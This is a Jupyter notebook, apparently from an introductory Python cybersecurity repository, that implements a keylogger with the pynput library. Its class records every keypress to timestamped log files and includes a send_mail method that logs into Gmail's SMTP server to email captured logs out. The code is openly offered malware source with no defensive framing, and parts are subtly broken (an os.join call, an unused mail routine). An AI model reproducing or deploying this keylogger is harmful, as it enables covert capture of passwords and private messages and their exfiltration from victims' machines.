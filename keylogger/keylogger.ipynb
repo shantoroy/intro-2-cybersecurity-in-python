{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# ! pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "class Keylogger:\n",
    "        \n",
    "    def create_log_directory(self):\n",
    "        sub_dir = \"log\"\n",
    "        cwd = os.getcwd()\n",
    "        self.log_dir = os.path.join(cwd,sub_dir)\n",
    "        if not os.path.exists(sub_dir):\n",
    "            os.mkdir(sub_dir)\n",
    "    \n",
    "    \n",
    "    @staticmethod\n",
    "    def on_press(key):\n",
    "        try:\n",
    "            logging.info(str(key))\n",
    "        except Exception as e:\n",
    "            logging.info(e)\n",
    "        \n",
    "            \n",
    "    def write_log_file(self):\n",
    "        # time format example: '2021-05-29-171747'\n",
    "        time = str(datetime.now())[:-7].replace(\" \", \"-\").replace(\":\", \"\")\n",
    "        # logging info in the file\n",
    "        logging.basicConfig(\n",
    "                 filename=(os.path.join(self.log_dir, time) + \"log.txt\"),\n",
    "                 level=logging.DEBUG, \n",
    "                 format= '[%(asctime)s]: %(message)s',\n",
    "             )\n",
    "        \n",
    "        with Listener(on_press=self.on_press) as listener:\n",
    "            listener.join()\n",
    "            \n",
    "            \n",
    "    def send_mail(self, email, password, TO, msg):\n",
    "        with smtplib.SMTP(\"smtp.gmail.com\", 587) as server:\n",
    "            try:\n",
    "                server.starttls()    # enable secure TLS mode\n",
    "                server.login(email, password)\n",
    "                server.sendmail(email, TO, msg)\n",
    "            except Exception as e:\n",
    "                pass\n",
    "            finally:\n",
    "                server.quit()\n",
    "                \n",
    "                \n",
    "    def read_last_log(self):\n",
    "        logs = os.listdir(self.log_dir)\n",
    "        with open(os.join(self.log_dir, logs[-1])) as f:\n",
    "            lines = [line.rstrip() for line in f]\n",
    "        self.msg = str(lines)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "import os\n",
    "from datetime import datetime\n",
    "\n",
    "import email,smtplib,ssl\n",
    "from email import encoders\n",
    "from email.mime.base import MIMEBase\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    klog = Keylogger()\n",
    "    klog.create_log_directory()\n",
    "    klog.write_log_file()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'2021-05-29-171747'"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str(datetime.now())[:-7].replace(\" \", \"-\").replace(\":\", \"\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'[3, 4, 5]'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = [3,4,5]\n",
    "b = str(a)\n",
    "b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
